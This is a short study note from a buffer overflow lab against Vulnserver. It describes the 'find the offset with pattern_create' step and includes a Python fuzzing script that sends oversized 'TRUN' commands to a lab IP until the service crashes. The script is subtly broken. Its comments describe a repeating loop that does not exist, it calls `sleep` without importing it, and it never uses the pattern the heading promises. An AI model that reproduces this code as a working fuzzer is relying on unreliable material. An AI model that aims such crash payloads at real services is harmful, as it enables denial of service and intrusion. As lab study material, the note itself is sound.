
# Finding the Offset w/ Pattern Create
Now that we know our offset from [fuzzing](PEH/buffer-overflows/fuzzing.md) the program, we can use [pattern create](/cybersecurity/tools/exploitation/pattern-create.md) to help fine-tune our exploit script and payload.

**![See Pattern Create](/cybersecurity/tools/exploitation/pattern-create.md)
** (relative)
[Pattern Create](https://github.com/TrshPuppy/obsidian-notes/blob/main/cybersecurity/tools/pattern-create.md) (GitHub repo)**
## Finding the **EXACT** Address
Now that we've created a buffer string with `pattern_create` we can copy paste our fuzzing script into a new script (which will become our exploit as we fine tune it).
```python
import sys, socket

# Create the buffer of 'A' characters
buffer = "A" * 100

try:
	# Build the payload by appending the TRUN command to the buffer
	payload = "TRUN /.:/" + buffer

	# Create, open, and connect to the socket (connecting to target)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.1.35',9999))

	# Send the payload to target
	print ("[+] Sending the payload...\n" + str(len(buffer)))
	s.send(payload)
	
	# Close connection and what 1 second
	s.close()
	sleep(1)

	# (if we haven't crashed) increase buffer length by 100 bytes & try again
	buffer = buffer + "A"*100
except:
	# When the target crashes, print the number of bytes it took
	print ("The fuzzing crashed at %s bytes" % str(len(buffer)))
	sys.exit()
```

> [!Resources]
> -  [Vulnserver](https://thegreycorner.com/vulnserver.html) 
> - [Immunity Debugger](https://www.immunityinc.com/products/debugger/) 
> - My [own notes](https://github.com/trshpuppy/obsidian-notes) linked throughout the text.
> - My [writeup on basic buffer overflow](https://trshpuppy.github.io/portfolio/writeups/basic-buffer-overflow)
